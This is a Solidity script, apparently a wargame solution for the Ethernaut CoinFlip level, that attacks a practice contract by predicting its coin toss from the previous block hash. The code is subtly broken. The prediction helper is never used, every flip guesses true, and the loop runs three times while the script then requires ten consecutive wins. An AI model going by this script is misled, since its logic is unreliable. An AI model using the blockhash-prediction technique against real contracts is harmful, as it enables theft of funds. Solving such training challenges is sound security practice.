pragma solidity ^0.8.0;

import "./base.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}

contract Ethernaut03 is Ethernaut {
    address constant factory =
        address(0x4dF32584890A0026e56f7535d0f2C6486753624f);

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public {
        // vm.startBroadcast();
        ICoinFlip flip = ICoinFlip(createNewInstance(factory));

        for (uint256 i = 0; i < 3; ++i) {
            console.log(block.number);
            console.logBytes32(blockhash(block.number - 1));
            flip.flip(true);

            vm.roll(block.number + 1);
        }

        require(flip.consecutiveWins() == 10, "not won");
        submit(factory, address(flip));
        // vm.stopBroadcast();
    }

    function guess() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
